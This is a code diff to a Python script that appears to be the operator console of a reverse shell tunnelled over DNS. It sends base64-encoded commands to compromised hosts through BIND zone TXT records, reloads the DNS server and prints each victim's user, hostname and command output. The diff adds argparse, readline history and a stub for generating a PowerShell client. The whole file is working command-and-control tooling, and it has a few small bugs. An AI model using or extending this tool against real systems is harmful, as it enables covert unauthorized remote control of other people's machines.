@@ -4,6 +4,8 @@ import sys
 import base64
 import json
 from pprint import pprint
+import readline
+import argparse  # Added argparse module
 
 print("""
      ______ _   _  _____ _          _ _ 
@@ -86,8 +88,8 @@ def getData(code, counter):
                         # decode base64
                         decoded = base64_decode_string(datastring)
                         # JSON decode
+                        print(f"JSON: {decoded}")
                         response = json.loads(decoded)
-                        #print(response)
                         return response
                         waitingfordata = False
 
@@ -100,55 +102,69 @@ def getData(code, counter):
                 #print(f"No match {line_str}")
 
 
+def generateClient():
+    # Function to generate client
+    print("Generating client... for domain {domain}")
 
-pwd = ""
-user = ""
-hostname = ""
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("--generate-client", action="store_true", help="Generates the .ps1 client file")
+    args = parser.parse_args()
 
-# Get Code from Client
-print("Waiting for client to connect... and identify itself")
-response = getData(0, 0)
-code = response["code"]
-pwd = response["pwd"]
-user = response["user"]
-hostname = response["hostname"]
+    if args.generate_client:
+        generateClient()
+    else:
+        pwd = ""
+        user = ""
+        hostname = ""
 
-print("")
-print("----------------------- Client connected -----------------------")
-print(f"ID for this Reverse Shell: {code}")
-print(f"User: {user}")
-print(f"Hostname: {hostname}")
-print("----------------------------------------------------------------")
-print("")
-
-
-filename = f"../bind/data/zones/revshell.{domain}.zone"
-preset = f"../bind/data/zones/revshell.{domain}.preset"
-
-command = ""
-counter = 0
-while(command != "exit"):
-    command = base64_encode_string(input(f"{user}@{hostname}: {pwd}>"))
-
-    # send command to client
-    zone = open(filename, "a")
-    zone.write(f"""{counter}.{code}       IN      TXT      {command}\n""")
-    zone.close()
-
-    # update zones on bind
-    reloadrnc = 'docker-compose -f "../docker-compose.yml" exec bind9 rndc reload'
-    subprocess.run(reloadrnc, shell=True,
-                   stdout=subprocess.DEVNULL,
-                   stderr=subprocess.STDOUT)
-
-    if(command != "exit"):
-        # Get response from client
-        response = getData(code, counter)
+        print("Waiting for client to connect... and identify itself")
+        response = getData(0, 0)
+        code = response["code"]
         pwd = response["pwd"]
         user = response["user"]
         hostname = response["hostname"]
-        output = response["output"]
-        
-        print(output)
 
-    counter += 1
+        print("")
+        print("----------------------- Client connected -----------------------")
+        print(f"ID for this Reverse Shell: {code}")
+        print(f"User: {user}")
+        print(f"Hostname: {hostname}")
+        print("----------------------------------------------------------------")
+        print("")
+
+        filename = f"../bind/data/zones/revshell.{domain}.zone"
+        preset = f"../bind/data/zones/revshell.{domain}.preset"
+
+        command = ""
+        counter = 0
+        while command != "exit":
+            command = input(f"{user}@{hostname}: {pwd}> ")
+
+            readline.add_history(command)
+
+            command = base64_encode_string(command)
+
+            zone = open(filename, "a")
+            zone.write(f"""{counter}.{code}       IN      TXT      {command}\n""")
+            zone.close()
+
+            reloadrnc = 'docker-compose -f "../docker-compose.yml" exec bind9 rndc reload'
+            subprocess.run(reloadrnc, shell=True,
+                           stdout=subprocess.DEVNULL,
+                           stderr=subprocess.STDOUT)
+
+            if command != "exit":
+                response = getData(code, counter)
+                pwd = response["pwd"]
+                user = response["user"]
+                hostname = response["hostname"]
+                output = response["output"]
+
+                print(output)
+
+            counter += 1
+
+
+if __name__ == "__main__":
+    main()
